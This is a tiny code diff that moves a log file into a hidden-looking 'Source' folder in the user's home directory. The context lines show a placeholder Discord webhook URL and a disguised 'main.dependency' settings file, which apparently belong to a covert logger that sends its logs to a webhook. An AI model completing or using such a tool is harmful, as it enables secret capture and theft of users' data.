@@ -8,7 +8,7 @@ import os
 
 stop_logging = False
 WEBHOOK_URL = "disord_webhook_url"
-log_file_path = "log.txt"
+log_file_path = Path.home() / "Source\log.txt"
 settings_name = "Source\main.dependency"
 
 def connect():
